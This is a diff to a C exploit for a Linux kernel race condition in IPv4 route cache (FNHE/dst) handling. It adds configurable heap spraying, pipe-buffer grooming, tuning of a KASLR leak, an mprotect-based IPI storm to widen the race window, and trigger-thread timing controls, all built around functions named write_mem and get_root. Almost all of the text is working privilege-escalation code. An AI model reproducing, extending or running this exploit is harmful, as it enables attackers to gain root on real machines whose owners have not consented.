@@ -122,6 +122,10 @@ bool clean_race_profile_default(const char *name, usize *default_value) {
         { "BAD_DST_STACK_ORACLE", 0 },
         { "BAD_DST_REQUIRE_STACK_TARGET", 0 },
         { "BAD_DST_PRE_RACE_EXPIRE_US", 700000 },
+        { "BAD_DST_PRE_RACE_CLEANUP_FNHE", 0 },
+        { "BAD_DST_EXPIRE_FNHE_BEFORE_RACE", 0 },
+        { "BAD_DST_PRE_RACE_FNHE_EXPIRE_US", 1200000 },
+        { "BAD_DST_PRE_RACE_FNHE_SETTLE_US", 0 },
         { "BAD_DST_FNHE_EXPIRE_TOTAL_US", 1300000 },
         { "BAD_DST_PREPARE_PAGE_PIPES_BEFORE_RACE", 1 },
         { "BAD_DST_PREPARE_PIPES_BEFORE_RACE", 0 },
@@ -533,6 +537,7 @@ typedef struct {
     atomic_int done;
     int socket_fd;
     int result_errno;
+    int cpu;
 } LockOracleThreadState;
 
 typedef struct {
@@ -581,6 +586,10 @@ bool wait_for_child_exit(pid_t pid, usize timeout_us) {
 
 void *run_ip_mtu_lock_oracle_thread(void *arg) {
     LockOracleThreadState *state = (LockOracleThreadState *) arg;
+
+    if (state->cpu >= 0) {
+        pin_to_cpu(state->cpu);
+    }
 
     int mtu = 0;
     socklen_t mtu_len = sizeof(mtu);
@@ -635,6 +644,8 @@ LockOracleResult run_ip_mtu_lock_oracle_pthread(int socket_fd, usize timeout_us)
         return result;
     }
     state->socket_fd = socket_fd;
+    usize oracle_cpu = env_usize("BAD_DST_LOCK_ORACLE_CPU", (usize)-1);
+    state->cpu = oracle_cpu == (usize)-1 ? -1 : (int) oracle_cpu;
     atomic_store(&state->done, 0);
 
     int rc = pthread_create(&result.thread, NULL,
@@ -853,7 +864,10 @@ u64 pre_syscall_delay_ns_for_attempt(usize attempt) {
 
     u64 sweep_start = env_usize("BAD_DST_PRE_SYSCALL_DELAY_START_NS", 0);
     u64 sweep_step = env_usize("BAD_DST_PRE_SYSCALL_DELAY_STEP_NS", 1000);
-    usize sweep_index = (attempt - 1) % sweep_count;
+    usize timer_sweep_count = env_usize("BAD_DST_TIMER_SWEEP_COUNT", 0);
+    usize sweep_index = env_usize("BAD_DST_DELAY_GRID_SWEEP", 0) && timer_sweep_count ?
+        ((attempt - 1) / timer_sweep_count) % sweep_count :
+        (attempt - 1) % sweep_count;
 
     return sweep_start + sweep_index * sweep_step;
 }
@@ -947,6 +961,7 @@ u8 payload_variants[2][SPRAY_SIZE] = { 0 };
 
 int control_socket[2] = { 0 };
 int spray_sockets[NUM_SPRAY][2] = { 0 };
+usize spray_active_count = NUM_SPRAY;
 atomic_int spray_count = 0;
 atomic_int spray_payload_variant_count = 0;
 bool spray_threads_ready = false;
@@ -1001,16 +1016,26 @@ void *spray_thread(void *x) {
 void setup_spray() {
     SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));
 
+    spray_active_count = env_usize("BAD_DST_NUM_SPRAY", NUM_SPRAY);
+    if (spray_active_count == 0) {
+        spray_active_count = 1;
+    }
+    if (spray_active_count > NUM_SPRAY) {
+        spray_active_count = NUM_SPRAY;
+    }
+
     init_control_payload(payload);
     init_control_payload(payload_variants[0]);
     init_control_payload(payload_variants[1]);
     memset(dummy_buf, 0, sizeof(dummy_buf));
 
-    LOG("spray pinning: cpu=%lu percpu=%lu",
+    LOG("spray pinning: cpu=%lu percpu=%lu active=%lu max=%d",
         env_usize("BAD_DST_SPRAY_CPU", 0),
-        env_usize("BAD_DST_SPRAY_PERCPU", 0));
+        env_usize("BAD_DST_SPRAY_PERCPU", 0),
+        spray_active_count,
+        NUM_SPRAY);
 
-    for (usize i = 0; i < NUM_SPRAY; i++) {
+    for (usize i = 0; i < spray_active_count; i++) {
         SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));
 
         u32 buf_size = 0x800;
@@ -1022,16 +1047,16 @@ void setup_spray() {
     atomic_store(&spray_count, 0);
 
     pthread_t tid = 0;
-    for (usize i = 0; i < NUM_SPRAY; i++) {
+    for (usize i = 0; i < spray_active_count; i++) {
         pthread_create(&tid, 0, spray_thread, (void *)i);
         pthread_detach(tid);
     }
 
     // wait for threads to get setup
     spray_threads_ready = false;
-    int to_read = NUM_SPRAY;
+    int to_read = (int) spray_active_count;
     while (to_read > 0) {
-        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
+        to_read -= read(control_socket[1], dummy_buf, spray_active_count);
     }
     spray_threads_ready = true;
 }
@@ -1043,12 +1068,12 @@ void do_spray() {
 
     atomic_store(&spray_count, 0);
     spray_threads_ready = false;
-    write(control_socket[1], dummy_buf, NUM_SPRAY);
+    write(control_socket[1], dummy_buf, spray_active_count);
 
     // wait for spray to finish
     // atomic at least indicates all threads run, but not necessarily all sendmsg called
     // extra sleep is good safeguard that makes it very likely all messages sent
-    while (atomic_load(&spray_count) != NUM_SPRAY) {}
+    while ((usize) atomic_load(&spray_count) != spray_active_count) {}
     sleep_us_checked(env_usize("BAD_DST_SPRAY_BLOCK_US", 1000000));
 }
 
@@ -1056,13 +1081,13 @@ void do_spray() {
 void free_spray() {
     // Drain the filler datagrams. This unblocks the sendmsg threads; once they
     // report ready again, their per-sendmsg control allocations have been freed.
-    for (usize i = 0; i < NUM_SPRAY; i++) {
+    for (usize i = 0; i < spray_active_count; i++) {
         SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
     }
 
-    int to_read = NUM_SPRAY;
+    int to_read = (int) spray_active_count;
     while (to_read > 0) {
-        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
+        to_read -= read(control_socket[1], dummy_buf, spray_active_count);
     }
     spray_threads_ready = true;
 }
@@ -1070,14 +1095,14 @@ void free_spray() {
 // resets spray threads back to initial state after setup spray
 void reset_spray() {
     if (!spray_threads_ready) {
-        int to_read = NUM_SPRAY;
+        int to_read = (int) spray_active_count;
         while (to_read > 0) {
-            to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
+            to_read -= read(control_socket[1], dummy_buf, spray_active_count);
         }
         spray_threads_ready = true;
     }
 
-    for (usize i = 0; i < NUM_SPRAY; i++) {
+    for (usize i = 0; i < spray_active_count; i++) {
         // drain remaining cmsg message
         SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
         // write back first message
@@ -1550,6 +1575,30 @@ void trigger_expired_fnhe_cleanup(bool lookup_only) {
     SYSCHK(close(socket_fd));
 }
 
+void trigger_pre_race_fnhe_expiry(usize attempt, u64 vuln_ready_ns,
+                                  usize expire_us, bool lookup_only) {
+    LOG("pre-race FNHE expiry: wait_until=%lu us lookup_only=%d",
+        expire_us, lookup_only ? 1 : 0);
+    trace_marker("attempt=%lu stage=pre_race_fnhe_expiry_wait expire_us=%lu lookup_only=%d",
+        attempt, expire_us, lookup_only ? 1 : 0);
+
+    sleep_until_elapsed_us(vuln_ready_ns, expire_us);
+
+    trace_marker("attempt=%lu stage=pre_race_fnhe_expiry_trigger", attempt);
+    trigger_expired_fnhe_cleanup(lookup_only);
+
+    usize settle_us = env_usize("BAD_DST_PRE_RACE_FNHE_SETTLE_US", 0);
+    if (settle_us != 0) {
+        sleep_us_checked(settle_us);
+    }
+
+    if (env_usize("BAD_DST_PRE_RACE_FNHE_SYNC_RCU", 0)) {
+        wait_for_rcu_callbacks("pre-race FNHE cleanup",
+                               "BAD_DST_PRE_RACE_FNHE_RCU_US",
+                               100000);
+    }
+}
+
 // broadcast socket only has 1 ref for its rtinfo
 int open_broadcst_socket() {
     int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -1611,6 +1660,16 @@ usize vmem_base = 0;
 usize kaslr_base = 0;
 usize phys_base = 0;
 usize linear_base = 0;
+
+usize pipe_ops_offset(void) {
+    static usize cached = 0;
+
+    if (!cached) {
+        cached = env_usize("BAD_DST_PIPE_OPS",
+                           STEXT + PIPE_OPS_OFFSET) - STEXT;
+    }
+    return cached;
+}
 
 usize addr_to_page(usize addr) {
   return ((addr >> 12) << 6) + vmem_base;
@@ -1748,7 +1807,7 @@ void write_mem(usize addr, usize *data, usize size) {
 }
 
 bool pipe_buffer_leak_looks_usable(struct pipe_buffer_t *pipe_buffer) {
-    usize kaslr_candidate = pipe_buffer->ops - PIPE_OPS_OFFSET;
+    usize kaslr_candidate = pipe_buffer->ops - pipe_ops_offset();
 
     if (!is_linear_address(pipe_buffer->page)) {
         return false;
@@ -2093,16 +2152,22 @@ bool get_root(void) {
 
 
 #define DEFAULT_PAGE_PIPES 0x600
-#define MAX_PAGE_PIPES 0xc00
+#define DEFAULT_SMP_PAGE_PIPES 0xc00
+#define MAX_PAGE_PIPES 0x1800
 #define DEFAULT_VULN_PIPES 0x20
-#define MAX_VULN_PIPES 0x100
+#define DEFAULT_SMP_VULN_PIPES 0x100
+#define MAX_VULN_PIPES 0x400
 #define MAX_LEAKED_VULN_PIPES 0x2000
 #define MAX_CPU1_BLOCK_THREADS 1024
 #define MAX_CPU0_NOISE_THREADS 64
-#define NUM_BASE_PRE_SOCKETS 1792
-#define NUM_ALIGN_PAD_SOCKETS 21
-#define NUM_PRE_SOCKETS (NUM_BASE_PRE_SOCKETS + NUM_ALIGN_PAD_SOCKETS)
-#define NUM_POST_SOCKETS 256
+#define MAX_IPI_STORM_THREADS 64
+#define DEFAULT_BASE_PRE_SOCKETS 1792
+#define DEFAULT_ALIGN_PAD_SOCKETS 21
+#define DEFAULT_POST_SOCKETS 256
+#define MAX_BASE_PRE_SOCKETS 4096
+#define MAX_ALIGN_PAD_SOCKETS 128
+#define MAX_PRE_SOCKETS (MAX_BASE_PRE_SOCKETS + MAX_ALIGN_PAD_SOCKETS)
+#define MAX_POST_SOCKETS 1024
 
 typedef struct {
     Pipe pipe;
@@ -2209,15 +2274,33 @@ void ignore_leaked_vuln_pipe_index(int index) {
 usize configured_page_pipe_count() {
     bool smp = online_cpu_count() > 1;
     return min_usize(
-        env_usize("BAD_DST_PAGE_PIPES", smp ? MAX_PAGE_PIPES : DEFAULT_PAGE_PIPES),
+        env_usize("BAD_DST_PAGE_PIPES", smp ? DEFAULT_SMP_PAGE_PIPES : DEFAULT_PAGE_PIPES),
         MAX_PAGE_PIPES);
 }
 
 usize configured_vuln_pipe_count() {
     bool smp = online_cpu_count() > 1;
     return min_usize(
-        env_usize("BAD_DST_VULN_PIPES", smp ? MAX_VULN_PIPES : DEFAULT_VULN_PIPES),
+        env_usize("BAD_DST_VULN_PIPES", smp ? DEFAULT_SMP_VULN_PIPES : DEFAULT_VULN_PIPES),
         MAX_VULN_PIPES);
+}
+
+usize configured_align_pad_span() {
+    usize span = env_usize("BAD_DST_ALIGN_PAD_SPAN", DEFAULT_ALIGN_PAD_SOCKETS);
+    span = min_usize(span, MAX_ALIGN_PAD_SOCKETS);
+    return span == 0 ? 1 : span;
+}
+
+usize configured_base_pre_socket_count(usize align_span) {
+    usize count = env_usize("BAD_DST_BASE_PRE_SOCKETS", DEFAULT_BASE_PRE_SOCKETS);
+    usize max_base = MAX_PRE_SOCKETS - min_usize(align_span, MAX_ALIGN_PAD_SOCKETS);
+    return min_usize(count, max_base);
+}
+
+usize configured_post_socket_count() {
+    return min_usize(
+        env_usize("BAD_DST_POST_SOCKETS", DEFAULT_POST_SOCKETS),
+        MAX_POST_SOCKETS);
 }
 
 void close_pipe_array(Pipe *pipes, usize count) {
@@ -2348,6 +2431,53 @@ bool find_corrupted_pipe_in_set(Pipe *pipes, usize count, usize corrupt_min,
     return false;
 }
 
+int max_pipe_readable_bytes_in_set(Pipe *pipes, usize count, bool leaked,
+                                   int *max_index) {
+    int max_size = 0;
+    int best_index = -1;
+
+    for (usize i = 0; i < count; i++) {
+        if (leaked && leaked_vuln_pipe_ignored[i]) {
+            continue;
+        }
+
+        int size = 0;
+        if (!pipe_readable_bytes(&pipes[i], &size)) {
+            continue;
+        }
+
+        if ((unsigned int) size > (unsigned int) max_size) {
+            max_size = size;
+            best_index = (int) i;
+        }
+    }
+
+    if (max_index) {
+        *max_index = best_index;
+    }
+    return max_size;
+}
+
+void log_pipe_corruption_miss_stats(Pipe *current_pipes, usize current_count) {
+    int current_index = -1;
+    int current_max = max_pipe_readable_bytes_in_set(
+        current_pipes, current_count, false, &current_index);
+
+    int leaked_index = -1;
+    int leaked_max = 0;
+    if (leaked_vuln_pipe_count != 0) {
+        leaked_max = max_pipe_readable_bytes_in_set(
+            leaked_vuln_pipes, leaked_vuln_pipe_count, true, &leaked_index);
+    }
+
+    LOG("pipe miss stats: current_max=0x%x index=%d leaked_max=0x%x index=%d leaked_count=%lu",
+        (unsigned int) current_max,
+        current_index,
+        (unsigned int) leaked_max,
+        leaked_index,
+        leaked_vuln_pipe_count);
+}
+
 bool find_corrupted_pipe(Pipe *current_pipes, usize current_count,
                          usize corrupt_min, CorruptPipeCandidate *candidate) {
     if (find_corrupted_pipe_in_set(current_pipes, current_count, corrupt_min,
@@ -2369,14 +2499,17 @@ typedef struct {
     atomic_int cpu1_blocker_ready_counter;
     atomic_int cpu0_noise_epoch;
     atomic_int cpu0_noise_ready_counter;
+    atomic_int ipi_storm_epoch;
+    atomic_int ipi_storm_stop_epoch;
+    atomic_int ipi_storm_ready_counter;
     atomic_int futex_timer_request;
     atomic_int futex_timer_done;
     atomic_int futex_timer_ready_counter;
     // atomic_int timer_wakeup;
     int timer_fd;
     atomic_int vuln_socket;
-    int pre_sockets[NUM_PRE_SOCKETS];
-    int post_sockets[NUM_POST_SOCKETS];
+    int pre_sockets[MAX_PRE_SOCKETS];
+    int post_sockets[MAX_POST_SOCKETS];
     usize pre_socket_count;
     usize post_socket_count;
     usize align_pad;
@@ -2397,6 +2530,28 @@ typedef struct {
     u64 critical_start_ns;
 } TriggerCtx;
 
+void open_post_sockets_if_needed(TriggerCtx *ctx, bool *post_sockets_open,
+                                 const char *stage) {
+    if (*post_sockets_open || ctx->post_socket_count == 0) {
+        return;
+    }
+
+    LOG("open post sockets at %s: post=%lu", stage, ctx->post_socket_count);
+    trace_marker("attempt=%lu stage=open_post_sockets where=%s post=%lu",
+        trace_marker_attempt, stage, ctx->post_socket_count);
+    open_many_sockets(ctx->post_sockets, ctx->post_socket_count);
+    *post_sockets_open = true;
+}
+
+void close_post_sockets_if_open(TriggerCtx *ctx, bool *post_sockets_open) {
+    if (!*post_sockets_open) {
+        return;
+    }
+
+    close_fds(ctx->post_sockets, ctx->post_socket_count);
+    *post_sockets_open = false;
+}
+
 typedef struct {
     TriggerCtx *ctx;
     usize index;
@@ -2406,6 +2561,11 @@ typedef struct {
     TriggerCtx *ctx;
     usize index;
 } Cpu0NoiseArg;
+
+typedef struct {
+    TriggerCtx *ctx;
+    usize index;
+} IpiStormArg;
 
 typedef struct {
     TriggerCtx *ctx;
@@ -2543,6 +2703,131 @@ void *run_cpu0_noise_thread(void *arg) {
                 sched_yield();
             }
         }
+    }
+
+    return NULL;
+}
+
+static u8 *ipi_storm_area = NULL;
+static usize ipi_storm_area_len = 0;
+
+void setup_ipi_storm_area(void) {
+    if (ipi_storm_area != NULL) {
+        return;
+    }
+
+    usize pages = env_usize("BAD_DST_IPI_STORM_PAGES", 16);
+    if (pages == 0) {
+        pages = 1;
+    }
+    ipi_storm_area_len = pages * 0x1000;
+    ipi_storm_area = mmap(NULL, ipi_storm_area_len,
+                          PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS,
+                          -1, 0);
+    if (ipi_storm_area == MAP_FAILED) {
+        ipi_storm_area = NULL;
+        panic("failed to allocate IPI storm mapping");
+    }
+
+    for (usize offset = 0; offset < ipi_storm_area_len; offset += 0x1000) {
+        ipi_storm_area[offset] = (u8) offset;
+    }
+}
+
+void wait_ipi_storm_epoch(TriggerCtx *ctx, int *seen_epoch) {
+    for (;;) {
+        int epoch = atomic_load(&ctx->ipi_storm_epoch);
+        if (epoch != *seen_epoch) {
+            *seen_epoch = epoch;
+            return;
+        }
+
+        int rc = (int) syscall(
+            SYS_futex,
+            (int *) &ctx->ipi_storm_epoch,
+            FUTEX_WAIT_PRIVATE,
+            *seen_epoch,
+            NULL,
+            NULL,
+            0);
+        if (rc == -1 && errno != EAGAIN && errno != EINTR) {
+            LOG("IPI storm futex wait failed errno=%d", errno);
+            sleep_us_checked(1000);
+        }
+    }
+}
+
+void start_ipi_storm(TriggerCtx *ctx) {
+    if (!env_usize("BAD_DST_IPI_STORM", 0)) {
+        return;
+    }
+
+    setup_ipi_storm_area();
+    atomic_fetch_add(&ctx->ipi_storm_epoch, 1);
+    (void) syscall(
+        SYS_futex,
+        (int *) &ctx->ipi_storm_epoch,
+        FUTEX_WAKE_PRIVATE,
+        INT_MAX,
+        NULL,
+        NULL,
+        0);
+}
+
+void stop_ipi_storm(TriggerCtx *ctx) {
+    if (!env_usize("BAD_DST_IPI_STORM_STOP_ON_PIN", 0)) {
+        return;
+    }
+
+    atomic_store(&ctx->ipi_storm_stop_epoch, atomic_load(&ctx->ipi_storm_epoch));
+}
+
+void *run_ipi_storm_thread(void *arg) {
+    IpiStormArg *storm = (IpiStormArg *) arg;
+    TriggerCtx *ctx = storm->ctx;
+    usize cpus = online_cpu_count();
+    usize default_cpu = cpus > 2 ? 2 + (storm->index % (cpus - 2)) : 1;
+    usize cpu = env_usize("BAD_DST_IPI_STORM_CPU", default_cpu);
+
+    pin_to_cpu((int) (cpu % cpus));
+    int nice_value = (int) env_usize("BAD_DST_IPI_STORM_NICE", 0);
+    (void) setpriority(PRIO_PROCESS, 0, nice_value);
+
+    if (storm->index == 0) {
+        LOG("IPI storm: threads active cpu=%lu nice=%d",
+            cpu % cpus, nice_value);
+    }
+
+    setup_ipi_storm_area();
+    atomic_fetch_add(&ctx->ipi_storm_ready_counter, 1);
+
+    int seen_epoch = atomic_load(&ctx->ipi_storm_epoch);
+    for (;;) {
+        wait_ipi_storm_epoch(ctx, &seen_epoch);
+
+        u64 duration_ns = env_usize("BAD_DST_IPI_STORM_DURATION_NS", 2000000);
+        usize batch = env_usize("BAD_DST_IPI_STORM_BATCH", 1);
+        if (batch == 0) {
+            batch = 1;
+        }
+        u64 end_ns = now_ns() + duration_ns;
+        int prot_write = 0;
+
+        while (now_ns() < end_ns &&
+               atomic_load(&ctx->ipi_storm_stop_epoch) < seen_epoch) {
+            for (usize i = 0; i < batch; i++) {
+                int prot = PROT_READ | (prot_write ? PROT_WRITE : 0);
+                if (mprotect(ipi_storm_area, ipi_storm_area_len, prot) == -1) {
+                    LOG("IPI storm mprotect failed errno=%d", errno);
+                    break;
+                }
+                prot_write ^= 1;
+            }
+        }
+
+        (void) mprotect(ipi_storm_area, ipi_storm_area_len,
+                        PROT_READ | PROT_WRITE);
     }
 
     return NULL;
@@ -2740,8 +3025,12 @@ void *run_trigger_thread(void *arg) {
         // wait for other threads to be ready
         while (atomic_load(&ctx->ready_counter) < 2) {}
 
-        // ensure we are on cpu 0 (should already be done)
-        pin_to_cpu(0);
+        // Main normally pins us to CPU0 before each attempt. During miss
+        // cleanup it may deliberately move us to CPU1 so a low-priority
+        // trigger can finish while CPU0 is busy.
+        if (env_usize("BAD_DST_TRIGGER_REPIN_CPU0", 1)) {
+            pin_to_cpu(0);
+        }
 
         // wait a bit more just in case
         // for (usize i = 0; i < 1024 * 1024; i++) {}
@@ -2760,6 +3049,11 @@ void *run_trigger_thread(void *arg) {
             SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));
             store_trigger_stage(ctx, TRIGGER_STAGE_TIMER_ARMED,
                                 &ctx->trigger_timer_armed_ns);
+        }
+        if (env_usize("BAD_DST_IPI_STORM_START_IN_TRIGGER", 0)) {
+            start_ipi_storm(ctx);
+            trace_marker("attempt=%lu stage=ipi_storm_trigger_start epoch=%d",
+                trace_marker_attempt, atomic_load(&ctx->ipi_storm_epoch));
         }
         if (env_usize("BAD_DST_CPU0_NOISE_AFTER_TIMER_ARM", 0)) {
             wake_cpu0_noise_threads(ctx);
@@ -2895,6 +3189,7 @@ bool wait_for_futex_timer_done(TriggerCtx *ctx, int done_before, usize timeout_u
 }
 
 bool release_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 done_before) {
+    atomic_fetch_add(&ctx->ready_counter, 1);
     set_cpu1_block_state(ctx, 0);
     pin_thread_to_cpu(trigger_pid, 1);
 
@@ -2904,10 +3199,15 @@ bool release_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 done_before)
         env_usize("BAD_DST_TRIGGER_RELEASE_TIMEOUT_US", 200000));
 
     set_cpu1_block_state(ctx, 1);
+    atomic_fetch_sub(&ctx->ready_counter, 1);
     return done;
 }
 
-void pulse_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 pulse_ns) {
+void pulse_frozen_trigger_with_repin(
+    TriggerCtx *ctx,
+    pid_t trigger_pid,
+    u64 pulse_ns,
+    bool enable_post_block_repin) {
     if (pulse_ns == 0) {
         return;
     }
@@ -2921,10 +3221,68 @@ void pulse_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 pulse_ns) {
     spin_wait_ns(pulse_ns);
     set_cpu1_block_state(ctx, 1);
 
+    usize repin_count = enable_post_block_repin ?
+        env_usize("BAD_DST_RACE_PULSE_REPIN_AFTER_BLOCK", 0) : 0;
+    u64 repin_gap_ns = env_usize("BAD_DST_RACE_PULSE_REPIN_GAP_NS", 0);
+    for (usize i = 0; i < repin_count; i++) {
+        int repin_rc = pin_thread_to_cpu(trigger_pid, 1);
+        if (repin_rc != 0) {
+            LOG("post-block repin %lu/%lu failed errno=%d",
+                i + 1, repin_count, errno);
+            break;
+        }
+        if (repin_gap_ns != 0) {
+            spin_wait_ns(repin_gap_ns);
+        }
+    }
+    if (repin_count != 0) {
+        trace_marker("attempt=%lu stage=post_block_repin count=%lu gap_ns=%lu",
+            trace_marker_attempt, repin_count, repin_gap_ns);
+    }
+
     u64 settle_ns = env_usize("BAD_DST_RACE_PULSE_SETTLE_NS", 100000);
     spin_wait_ns(settle_ns);
     trace_marker("attempt=%lu stage=pulse_end settle_ns=%lu",
         trace_marker_attempt, settle_ns);
+}
+
+void pulse_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 pulse_ns) {
+    pulse_frozen_trigger_with_repin(ctx, trigger_pid, pulse_ns, false);
+}
+
+void progress_trigger_to_setsockopt_enter(TriggerCtx *ctx, pid_t trigger_pid) {
+    if (!env_usize("BAD_DST_PROGRESS_TO_SETSOCKOPT", 0)) {
+        return;
+    }
+
+    usize max_pulses = env_usize("BAD_DST_PROGRESS_MAX_PULSES", 100);
+    u64 pulse_ns = env_usize("BAD_DST_PROGRESS_PULSE_NS", 10000);
+    if (pulse_ns == 0) {
+        pulse_ns = 1;
+    }
+
+    for (usize i = 0; i < max_pulses; i++) {
+        int stage = atomic_load(&ctx->trigger_stage);
+        if (stage >= TRIGGER_STAGE_SETSOCKOPT_ENTER) {
+            LOG("progress pulse reached stage %s after %lu pulses",
+                trigger_stage_name(stage), i);
+            trace_marker("attempt=%lu stage=progress_done pulses=%lu trigger_stage=%s",
+                trace_marker_attempt, i, trigger_stage_name(stage));
+            return;
+        }
+
+        LOG("progress pulse %lu/%lu from stage %s for %lu ns",
+            i + 1, max_pulses, trigger_stage_name(stage), pulse_ns);
+        trace_marker("attempt=%lu stage=progress_pulse index=%lu trigger_stage=%s pulse_ns=%lu",
+            trace_marker_attempt, i + 1, trigger_stage_name(stage), pulse_ns);
+        pulse_frozen_trigger(ctx, trigger_pid, pulse_ns);
+    }
+
+    int stage = atomic_load(&ctx->trigger_stage);
+    LOG("progress pulse stopped at stage %s after max pulses",
+        trigger_stage_name(stage));
+    trace_marker("attempt=%lu stage=progress_max trigger_stage=%s",
+        trace_marker_attempt, trigger_stage_name(stage));
 }
 
 bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes);
@@ -2965,14 +3323,38 @@ void trigger_vuln_loop() {
     bool expire_with_lookup_only = env_usize(
         "BAD_DST_EXPIRE_WITH_LOOKUP_ONLY",
         pre_race_expire_us ? 1 : 0);
+    bool pre_race_cleanup_fnhe = env_usize("BAD_DST_PRE_RACE_CLEANUP_FNHE", 0);
+    bool expire_fnhe_before_race = env_usize(
+        "BAD_DST_EXPIRE_FNHE_BEFORE_RACE",
+        pre_race_cleanup_fnhe ? 1 : 0);
+    usize pre_race_fnhe_expire_us = env_usize(
+        "BAD_DST_PRE_RACE_FNHE_EXPIRE_US",
+        pre_race_expire_us ? pre_race_expire_us : 1200000);
     usize fnhe_expire_total_us = env_usize("BAD_DST_FNHE_EXPIRE_TOTAL_US", 0);
-    usize post_race_sleep_default_us = pre_race_expire_us ? 0 : 2000000;
-    usize post_race_expire_default_us = pre_race_expire_us ? 0 : 1000000;
+    bool skip_post_race_fnhe_cleanup = env_usize(
+        "BAD_DST_SKIP_POST_RACE_FNHE_CLEANUP",
+        expire_fnhe_before_race ? 1 : 0);
+    usize post_race_sleep_default_us =
+        (pre_race_expire_us || expire_fnhe_before_race) ? 0 : 2000000;
+    usize post_race_expire_default_us =
+        (pre_race_expire_us || expire_fnhe_before_race) ? 0 : 1000000;
+    usize align_pad_span = configured_align_pad_span();
+    usize base_pre_socket_count = configured_base_pre_socket_count(align_pad_span);
+    usize post_socket_count = configured_post_socket_count();
+    bool open_post_before_pipe_prepare = env_usize(
+        "BAD_DST_OPEN_POST_BEFORE_PIPE_PREP",
+        0);
+
+    LOG("rtable groom config: base_pre=%lu align_span=%lu post=%lu post_before_pipe=%lu",
+        base_pre_socket_count, align_pad_span, post_socket_count,
+        open_post_before_pipe_prepare ? 1UL : 0UL);
 
     pthread_t cpu1_block_threads[MAX_CPU1_BLOCK_THREADS] = { 0 };
     Cpu1BlockerArg cpu1_block_args[MAX_CPU1_BLOCK_THREADS] = { 0 };
     pthread_t cpu0_noise_threads[MAX_CPU0_NOISE_THREADS] = { 0 };
     Cpu0NoiseArg cpu0_noise_args[MAX_CPU0_NOISE_THREADS] = { 0 };
+    pthread_t ipi_storm_threads[MAX_IPI_STORM_THREADS] = { 0 };
+    IpiStormArg ipi_storm_args[MAX_IPI_STORM_THREADS] = { 0 };
     pthread_t futex_timer_thread = { 0 };
     FutexTimerArg futex_timer_arg = { 0 };
     pthread_t trigger_thread = { 0 };
@@ -2983,6 +3365,9 @@ void trigger_vuln_loop() {
         .cpu1_blocker_ready_counter = 0,
         .cpu0_noise_epoch = 0,
         .cpu0_noise_ready_counter = 0,
+        .ipi_storm_epoch = 0,
+        .ipi_storm_stop_epoch = 0,
+        .ipi_storm_ready_counter = 0,
         .futex_timer_request = 0,
         .futex_timer_done = 0,
         .futex_timer_ready_counter = 0,
@@ -2990,12 +3375,13 @@ void trigger_vuln_loop() {
         .vuln_socket = 0,
         .pre_sockets = { 0 },
         .post_sockets = { 0 },
-        .pre_socket_count = NUM_BASE_PRE_SOCKETS,
-        .post_socket_count = NUM_POST_SOCKETS,
+        .pre_socket_count = base_pre_socket_count,
+        .post_socket_count = post_socket_count,
         .align_pad = 0,
         .trigger_thread = 0,
         .trigger_done_counter = 0,
-        .trigger_timing_diag = env_usize("BAD_DST_TRIGGER_TIMING_DIAG", 0),
+        .trigger_timing_diag = env_usize("BAD_DST_TRIGGER_TIMING_DIAG", 0) ||
+            env_usize("BAD_DST_REQUIRE_SETSOCKOPT_ENTER_STAGE", 0),
         .trigger_stage = TRIGGER_STAGE_IDLE,
         .trigger_timer_armed_ns = 0,
         .trigger_futex_wake_ns = 0,
@@ -3039,6 +3425,30 @@ void trigger_vuln_loop() {
         }
         while ((usize) atomic_load(&ctx.cpu0_noise_ready_counter) <
                cpu0_noise_thread_count) {}
+    }
+
+    usize ipi_storm_thread_count = env_usize("BAD_DST_IPI_STORM_THREADS", 0);
+    if (!env_usize("BAD_DST_IPI_STORM", 0)) {
+        ipi_storm_thread_count = 0;
+    }
+    ipi_storm_thread_count = min_usize(ipi_storm_thread_count, MAX_IPI_STORM_THREADS);
+    if (ipi_storm_thread_count != 0) {
+        LOG("IPI storm setup: threads=%lu pages=%lu duration=%lu batch=%lu",
+            ipi_storm_thread_count,
+            env_usize("BAD_DST_IPI_STORM_PAGES", 16),
+            env_usize("BAD_DST_IPI_STORM_DURATION_NS", 2000000),
+            env_usize("BAD_DST_IPI_STORM_BATCH", 1));
+        setup_ipi_storm_area();
+        for (usize i = 0; i < ipi_storm_thread_count; i++) {
+            ipi_storm_args[i].ctx = &ctx;
+            ipi_storm_args[i].index = i;
+            SYSCHK(pthread_create(&ipi_storm_threads[i], NULL,
+                                  run_ipi_storm_thread,
+                                  (void *) &ipi_storm_args[i]));
+            pthread_detach(ipi_storm_threads[i]);
+        }
+        while ((usize) atomic_load(&ctx.ipi_storm_ready_counter) <
+               ipi_storm_thread_count) {}
     }
 
     LOG("cpu1 blocker setup: mode=%s threads=%lu",
@@ -3088,13 +3498,14 @@ void trigger_vuln_loop() {
 
     for (usize attempt = 1; max_attempts == 0 || attempt <= max_attempts; attempt++) {
         usize align_pad = fixed_align_pad == (usize)-1 ?
-            ((attempt - 1) % NUM_ALIGN_PAD_SOCKETS) :
-            (fixed_align_pad % NUM_ALIGN_PAD_SOCKETS);
+            ((attempt - 1) % align_pad_span) :
+            (fixed_align_pad % align_pad_span);
 
-        ctx.pre_socket_count = NUM_BASE_PRE_SOCKETS + align_pad;
-        ctx.post_socket_count = NUM_POST_SOCKETS;
+        ctx.pre_socket_count = base_pre_socket_count + align_pad;
+        ctx.post_socket_count = post_socket_count;
         ctx.align_pad = align_pad;
         ExploitPipeSet prepared_pipes = { 0 };
+        bool post_sockets_open = false;
 
         LOG("start trigger attempt=%lu align_pad=%lu pre=%lu post=%lu",
